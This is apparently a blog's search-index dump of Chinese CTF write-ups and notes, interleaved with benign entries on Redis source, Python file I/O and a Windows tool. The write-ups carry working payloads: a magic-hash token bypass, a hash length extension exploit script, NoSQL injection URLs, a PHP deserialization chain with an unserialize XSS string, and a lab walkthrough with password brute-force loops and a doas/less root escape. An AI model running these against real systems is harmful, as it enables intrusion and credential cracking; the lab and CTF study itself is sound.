'****不可见***', '***不可见***', 0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; token是0e00000000即可绕过 payload如下： http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>web</tag>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows资源管理器神器]]></title>
    <url>%2F2019%2F08%2F05%2Fwindows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm 于是去搜了一下用来增强资源管理器的工具找到了这个： QTTabBar 可以说是体验很棒了 网址 比如多标签页 再比如文件和文件夹预览 总之很棒就是了]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>资源管理器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初见哈希扩展攻击]]></title>
    <url>%2F2019%2F08%2F05%2F%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 这其中secret_key是不知道的,并且gengeSign限制了action只能是scan,结合后来题目的提示是访问flag.txt,但是最多将这个文件读入result.txt,却不能读取出来。 这样想来是不是只能爆破secret_key了？但是secret_key又怎么会那么容易给你呢。。 这就涉及到我的知识盲区了,叫做哈希扩展攻击。。 先看实验吧一道例题 这题，注入不想注入，源码没扫出来，啥信息都没有？ 还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了 hhh没想到吧 原来可以通过这种方式获取到源代码。。 12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; empty函数 非空返回false，别想多了 关键在这里： if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { 其中$secret是不知道的，$username和password是可以控制的，并且$secret的长度是15 哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞 首先username必须是admin,password不能是admin那就随便输一个值比如cck 我们的目标很简单，就是绕过它 if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { 所以目标就是让$COOKIE[&quot;getmein&quot;]和md5后的值相等，所以需要同时伪造两边的值天平才能平衡 而hashpump工具就是来干这个的： 第一个参数是md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。 这样就能同时生成天平左边和右边的值了 当然还需要URL编码一下 理解了这题那么这道De1ctf的题目也就好说了 参考ctftime上的exp代码如下： 123456789101112131415161718192021222324252627282930import requests,hashpumpy,urllib"""hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hashReturns: A tuple containing the new hex digest and the new message.'"""payload = 'flag.txt'param = 'param=' + payloadbase_url = 'http://139.180.128.86/'signurl = base_url + 'geneSign?' + paramr = requests.post(url=signurl,cookies=&#123;'action':'scan'&#125;)sign = r.contentprint(sign)readsign,add_data = hashpumpy.hashpump(sign,payload+'scan','read',16)print(readsign)# print add_dataadd_data = add_data[len(payload):]print(add_data)expurl = base_url + 'De1ta?' + paramprint(urllib.parse.quote(add_data))r = requests.post(url=expurl,cookies=&#123;'action':urllib.parse.quote(add_data),'sign':readsign&#125;)print(r.content) 当然我用的是python3，并且注意urllib.parse.quote(add_data)方法 就成功了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>De1ctf</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[noSQL Injection]]></title>
    <url>%2F2019%2F08%2F04%2FnoSQL-Injection%2F</url>
    <content type="text"><![CDATA[cybrics noSQL 这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下 php操作mongodb的语法： 123456789// connect to mongodb$m = new MongoClient();// select a database$db = $m-&gt;test;// select collection$collection = $db-&gt;users;$cursor = $collection-&gt;find($data);$cursor = $collection-&gt;findone($data); 基本上就是实例化对象，选择数据库，选择表，然后开始查找 查询语法主要如下： 123456789db.user.find(&#123;'username': 'xxxppp'&#125;)//查找用户名不为admin且password为123456的用户db.user.find(&#123;'username':&#123;$ne:'admin'&#125;, 'password':'123456'&#125;)//正则匹配：db.customer.find(&#123;'name': &#123;'$regex':'.*s.*'&#125; &#125;)db.user.find(&#123;'username':/jrx/i&#125;) 这道题目首先可以用dirsearch发现是git源码泄露，之后用GitHacker.py获取到源码 查看index.php，首先要登陆，需要绕过auth函数 123456789function auth($username, $password) &#123; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;"username": "'.$username.'", "password": "'.$password.'"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125; username和password都没有经过过滤就拼接了，但是这里有一个json_decode不太好过 如果没有json_decode函数，我们可以通过{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}绕过登陆的限制 于是这样做： 这样就绕过限制登陆了 来看第二个： 1234567891011121314151617&lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));?&gt; array_merge函数将$pipeline和filters进行合并 查找资料得知 在mongodb的aggregate中，可以使用$cond进行条件语句： 并且： 我们可以构造如下链接，匹配到flag时将其移除 http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category 利用条件语句，发现flags时，就输出其title： http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category 从title中我们得知有text，那么读取： http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category 就可以获得flag了 NoSQL注入实践 MongoDb作为一个NoSQL的数据库，操作其实还是很SQL很相似的 都有数据库，不同的是集合对应于表，文档对应于行，字段对应于列 这张图显示了映射关系： 于是操作MongoDb时可以理解为选择数据库，然后选择collection，然后构造查询语句进行查询 比如demo.html $m = new MongoClient()连接数据库，$db=$m-&gt;test选择test数据库，然后选择collection : $collection=$db-&gt;uses 构造的查询语句为： 12345$data = array( &apos;username&apos; =&gt; $_REQUEST[&apos;username&apos;], &apos;password&apos; =&gt; $_REQUEST[&apos;password&apos;] ); 之后进行查询： $cursor = $collection-&gt;find($data) 这里没有字符串的拼接，似乎无法注入，但是如果我们传入的username和password都是数组的话，那么查询的语句就会成为这样： 构造的URL：http://localhost/NoSQLI/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login 此时拼接的$data json_encode后得到： &quot;{&quot;username&quot;:{&quot;$ne&quot;:&quot;1&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}&quot; 参考 NoSQL注入总结(MongoDB) 019 CyBRICS CTF Quals wp]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>cybrics</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb复现]]></title>
    <url>%2F2019%2F08%2F03%2Fqwb%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现一些qwb的题目 upload 可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件 如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索unserialize找到一处可以利用的代码： 123456789101112public function login_check()&#123; $profile=cookie('user'); //获取到cookie中的user值 if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); //直接反序列化 $this-&gt;profile_db=db('user')-&gt;where("ID",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; 接下来去寻找哪里调用了这个方法，在Profile这个类中 123456789public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; ... upload_img方法会调用login_check反序列化 而这个操作中的 $this-&gt;ext、$this-&gt;filename_tmp、$this-&gt;filename 均可通过反序列化控制。 同时在Profile.php文件的末尾还有一处 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 这两个函数的意思是如果访问了类中的private属性，就会调用__get方法，如果调用了类中不存在的方法，就会通过__call对$this-&gt;name所指向的方法进行调用 意味着我们可以调用任意的类方法 同时在Register.php中有一处： 123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; 首先上传一个图片马，之后通过Register类的__destruct方法，调用__get方法得到函数名upload_img，再调用__call方法，通过调用upload_img可以对图片马进行改名 如果我们将$this-&gt;checker赋值为Profile类，由于Profile类中不存在index方法，就会触发__call，这样就能构造一条完成的攻击链 高明的黑客 1234567891011121314151617181920212223242526272829import os,reimport requestsfilenames = os.listdir('/var/www/html/src')pattern = re.compile(r"\$_[GEPOST]&#123;3,4&#125;\[.*\]")for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' # command = 'phpinfo();' # flag = 'phpinfo' if 'GET' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.get(url='http://127.0.0.1:8888/' + name + '?' + passwd + '='+ command) if flag in r.text: print('backdoor file is: ' + name) print('GET: ' + passwd) elif 'POST' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.post(url='http://127.0.0.1:8888/' + name,data=&#123;passwd:command&#125;) if flag in r.text: print('backdoor file is: ' + name) print('POST: ' + passwd) except : pass]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIR-823G复现]]></title>
    <url>%2F2019%2F08%2F03%2FDIR-823G%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Dlink DIR-823G漏洞复现(CVE-2019-7298, CVE-2019-7297) binwale提取文件 文件下载地址 之后进行固件的模拟， 成功ping通网络 第一次进入路由器需要需要进行一些设置页面，查看是否有未授权访问的情况 导出配置文件（信息泄露）。 &lt;!-- --&gt; 浏览器访问直接弹出了下载页面 导出配置文件， 获取到系统信息 goahead程序分析(命令注入) 在查看固件的bin目录时发现了一个goahead的程序，说明此路由器是通过goahead进行开发的 拖入到IDA中进行分析，发现0x42424C处注册了处理函数 抓取到登陆的数据包，是发往/HNAP1/的 分析/HNAP1 处理函数的逻辑。 函数位于0x42383C 在这个部分，从函数表中进行遍历，寻找函数 函数表如下： 找到了需要调用的处理函数后，会首先记录 POST 的原始报文, 首先用 snprintf 生成命令， 然后使用 system 执行。 我们可以通过直接注入 ' 来命令执行 验证一下： 参考 DIR-823G HNAP_Entry_Func]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>goahead</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记3]]></title>
    <url>%2F2019%2F07%2F31%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03%2F</url>
    <content type="text"><![CDATA[python文件操作 读文件，使用open函数打开一个文件 如果不指定模式，则默认以 text mode 打开 这意味着从文件中读取或写入字符串时，都会以指定的编码方式进行编码。如果未指定编码格式，默认值与平台相关 read()方法，可选参数size，当 size 被省略或者为负的时候，将读取并返回文件的整个内容 readline()方法，从文件中读取一行 如果要遍历文件，可以采取遍历文件对象的方式： 12&gt;&gt;&gt; for line in f:... print(line, end='') 这种实现方式比较高效 在编写脚本的过程中，注意文件的打开方式，编码这些小细节 写文件 f.write(string) 会把 string 的内容写入到文件中，并返回写入的字符数。 f.tell() 返回一个整数，给出文件对象在文件中的当前位置，表示为二进制模式下时从文件开始的字节数，以及文本模式下的不透明数字。]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cybrics复现]]></title>
    <url>%2F2019%2F07%2F31%2Fcybrics%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[目前太菜了，没做出几道cybrics的题目，趁着题目还在复现一波 Zakukozh 下载地址 下载了一个文件，于是想查看文件类型： zakukozh.bin: data 题目中有提示说是affine cipher affine cipher中文翻译过来就是放射密码，可以理解成简单的替换加密，比如wikipedia上举出的栗子 一个大小为m的字母表，通过变换 $E(x) = (ax+b) mod , m$ 得到密文 查看文件的十六进制形式，学习一些hexdump命令 1234567891011pxy@LAPTOP-UBIEP4K5  /mnt/f/1.ctf/cybrics/crypto  hexdump -C zakukozh.bin| head00000000 60 09 eb 82 1c ef df ef 59 59 59 1c a0 91 55 27 |`.......YYY...U&apos;|00000010 59 59 77 bc 59 59 59 2e d1 77 59 59 59 a9 44 38 |YYw.YYY..wYYY.D8|00000020 31 59 59 59 68 16 27 82 37 59 8b 6b fd 00 59 59 |1YYYh.&apos;.7Y.k..YY|00000030 59 95 62 28 dc 28 59 59 b8 ba fe 1d 08 a4 59 59 |Y.b(.(YY......YY|00000040 59 e0 e9 91 90 16 59 59 2b c6 59 59 2b c6 68 02 |Y.....YY+.YY+.h.|00000050 da 31 35 59 59 fe 7e a0 55 28 45 61 db 3c 3d 10 |.15YY.~.U(Ea.&lt;=.|00000060 08 a6 a1 a3 a4 89 ab 3e 68 b0 1b 82 a6 35 fd cd |.......&gt;h....5..|00000070 1c e0 d9 de 59 67 7f e3 45 70 b0 e2 e6 22 55 17 |....Yg..Ep...&quot;U.|00000080 32 d9 de 3e 87 1d d2 c2 59 51 e7 e6 59 49 a2 82 |2..&gt;....YQ..YI..|00000090 68 39 eb ab 77 19 7d fd a4 d9 a1 b0 ef 59 f8 07 |h9..w.&#125;......Y..| 查看十六进制数据如上，根据题目的提示，这就是仿射加密之后的结果，那么如何确定a,b,m这三个参数 由于是二进制数据，那么m就是256 a和b就通过爆破来解决 脚本如下： 123456789101112def reffine(a, b, c): return chr((a * (ord(c) - b)) % 256)with open('zakukozh.bin') as f: encrypted = f.read()for i in range(256): for j in range(256): decrypted = ''.join([reffine(i, j, c) for c in encrypted]) with open('output/dec_&#123;&#125;_&#123;&#125;.out'.format(i, j), 'wb') as f: f.write(decrypted) 就是跑的太慢了 😂]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>cybrics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis源码阅读——dict]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict%2F</url>
    <content type="text"><![CDATA[dict类型 先看宏定义 最基本的是dict类型，如下： 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */ int iterators; /* number of iterators currently running */&#125; dict; dictType 是一个结构体，包含了dict的一些基础方法 privdata 是私有数据 dictht 是哈希表 rehashidx 代表是否在进行重哈希，如果不为-1则代表正在进行重哈希 iterators 代表迭代器，暂时还不太理解 接下来看哈希表的结构(dictht): 123456typedef struct dictht &#123; dictEntry **table; PORT_ULONG size; PORT_ULONG sizemask; PORT_ULONG used;&#125; dictht; table是一个指向dictEntry的二级指针 size代表哈希表的大小 sizemask 总是等于size-1 used代表该哈希表已有的节点数量 这是dictht的构造： 不过这里为什么要二级指针呢？ 可以这样理解，因为dictEntry *本身就是一个一级指针，同时table指向的又是一个指针数组，所以这里需要二级指针了 复习一下数组指针和指针数组的概念 数组指针，本质上还是指针 int (*p)[n] ()运算优先级更高，*优先与p结合，p还是一个指针，不过p指向的是一个数组，这时候p+1运算的步长就是n,故这样的指针也叫行指针 指针数组 int *p[n] []优先级更高，p先与方括号结合，这时候p代表的是一个数组，这个数组中每个元素都是一个指针，故此时p就是二级指针 之后继续看dictEntry类型 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; 这里面存储了key-value键值对，其中key是一个void*类型的指针，可以代表任意类型的数据，但是value是一个联合体，可以在指针，整数和浮点数中取值 next属性是指向另一个哈希表节点的指针， 这个指针可以将多个哈希值相同的键值对连接在一次， 以此来解决键冲突（collision）的问题 参考 字典的实现 Redis内部数据结构详解(1)——dict 数组指针和指针数组的区别]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>dict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis源码阅读——sds]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds%2F</url>
    <content type="text"><![CDATA[从redis源码开始 都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是便从头开始读起了redis的源码]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>sds</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透]]></title>
    <url>%2F2019%2F07%2F30%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[fourandsix2靶机 一开机就可以看到IP地址位192.168.41.132 然后nmap开始扫描 nmap -A -n -v -Pn -A 192.168.41.132 -A Enable OS detection, version detection, script scanning, and traceroute -n -n/-R: Never do DNS resolution/Always resolve [default: sometimes] -Pn Treat all hosts as online -- skip host discovery 扫描的报告： 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.41.132Host is up (0.00059s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:| 2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)| 256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)|_ 256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware)Device type: general purposeRunning: OpenBSD 6.XOS CPE: cpe:/o:openbsd:openbsd:6OS details: OpenBSD 6.0 - 6.1Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: RandomizedTRACEROUTEHOP RTT ADDRESS1 0.59 ms 192.168.41.132 难得一次nmap可以扫出这么多信息 看到靶机开放了2049号端口，是nfs服务，那么尝试扫描可以挂载的目录 -sV : Probe open ports to determine service/version info nmap -sV --script=nfs-showmount 192.168.41.132 扫描可以挂载的目录 结果： 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)111/tcp open rpcbind 2 (RPC #100000)| nfs-showmount:|_ /home/user/storage| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware) 很好，那就可以挂载目录了 12root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/nfspy@192.168.41.132:/home/user/storage:/&gt; nfspysh的用法： 12345678root@kali:~# nfspysh -hUsage: nfspysh [options]Options: -h, --help show this help message and exit -l List mount options available -o OPTIONS Mount options as in nfspy -c COMMAND Semicolon-separated commands to run (batch mode) 目录下有一个压缩包 get backup.7z 然后尝试用7z去解压缩，但是有密码 于是用john去破解 然而爆破有点慢 不过密码就是chocolate ps.kali里面其实有很多字典的，比如/usr/share/john/password.lst 解压缩之后得到的是一个公钥和私钥 通过下面这段脚本爆破出密码是12345678 12root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done12345678 然后就可以登陆了 ssh -i id_rsa user@192.168.41.132 之前一直尝试没登陆成功，因为我忘记赋权了 也就是 chmod 600 id_rsa 然后就可以登陆了： 1234567891011121314root@kali:/tmp# ssh -i id_rsa user@192.168.41.132Enter passphrase for key &apos;id_rsa&apos;:Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code. With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.fourandsix2$ 如下是错误的做法： 1234567root@kali:/tmp# ssh -i id_rsa user@192.168.41.132@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0777 for &apos;id_rsa&apos; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored. 登陆之后 没办法直接访问root文件夹 12fourandsix2$ ls /root/ls: /root/: Permission denied 接下来这波操作很不明白 输入 doas /usr/bin/less /var/log/authlog 然后按v进入编辑模式 之后输入:!/bin/sh 于是就提权了 12fourandsix2# whoamiroot 成功了 1234567891011fourandsix2# cat /root/flag.txt Nice you hacked all the passwords!Not all tools worked well. But with some command magic...:cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;donecat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;doneHere is the flag:acd043bc3103ed3dd02eee99d5b0ff42 补充提权的过程： 在/etc/doas.conf文件中有这些内容 所以可以用doas命令查看authlod文件 同时，通过编辑它，进入了shell 参考 FourAndSix2.01靶机渗透]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化笔记]]></title>
    <url>%2F2019%2F07%2F30%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[php 反序列化 先看一个栗子： 12345678910&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20";&#125;$test1 = new Test();$object = serialize($test1);print_r($object); 序列化之后得到的结果是： O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;} O代表是对象，Test是类名，之后是属性，不同类型的属性其实序列化之后得到的结果是不一样的。 看官方文档，解释了为什么需要序列化这种操作： serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 同时提到了一个魔术方法： 当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 __sleep()和__wakeup()两个方法很形象地说明了什么时候调用。 然后我就犯了一个新手很常见的错误： __sleep()方法必须是要返回一个array地 原来。。__sleep()方法是这样子调用的啊 123456789&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20"; function __sleep()&#123; return array('name', 'sex', 'age'); &#125;&#125; 实际追踪一下为什么会出现反序列化 调试代码如下: 12345678910&lt;?phpclass test&#123; public $target = "this is a test"; function __destruct()&#123; echo $this-&gt;target; &#125;&#125;$a = $_GET['b'];$c = unserialize($a); 利用思路：传入的参数是可控的，并且这里还有一个test类和一个__destruct()魔术方法。 那就是构造这个对象将其序列化之后传入，之后会自动反序列化同时在对象销毁的时候就会自动执行魔术方法了 我们这样来写： 1234567&lt;?class test&#123; public $target = "&lt;script&gt;alert('xss');&lt;/script&gt;";&#125;$object = new test();print_r(serialize($object)); 突然觉得序列化也有一点变量覆盖的味道，我在外部构造的类实例化的对象进入代码之后覆盖了原来的对象？ 调试过程如下： 生成的序列化字符串如下： O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;} 然后将其作为参数传入进去: http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;} 此时接收到了参数： $a的值为：&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot; 继续单步步入： 这个时候就会去调用魔术方法了 xss框框就弹出来啦。 接下来继续研究剩下的魔术方法：先看几个简单的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass test&#123; public $name = 'P2hm1n'; function __construct()&#123; echo "__construct()\n"; &#125; function __destruct()&#123; echo "__destruct()\n"; &#125; function __wakeup()&#123; echo "__wakeup()\n"; &#125; function __toString()&#123; return "__toString()"."\n"; &#125; function __sleep()&#123; echo "__sleep()\n"; return array("name"); &#125; function __call($funName, $argument)&#123; echo "调用方法".$funName."(:"."参数:"; print_r($argument); echo "不存在！\n"; &#125; public static function __callStatic($funName, $argument)&#123; echo "调用静态方法".$funName."(:"."参数:"; print_r($argument); echo "不存在！\n"; &#125;&#125;$test1 = new test();test::hello("nihao"); //不实例化对象，此时调用的是静态方法$test1-&gt;hello("nihao"); //实例化对象$test2 = serialize($test1);$test3 = unserialize($test2);print($test3); 输出的结果如下： 123456789101112131415调用静态方法hello(:参数:Array( [0] =&gt; nihao)不存在！调用方法hello(:参数:Array( [0] =&gt; nihao)不存在！__sleep()__wakeup()__toString()__destruct()__destruct() 这几个方法都还挺好区分的，比较难区分的就是__call()和__callStatic()方法了。 TODO 十六个魔术方法详解]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
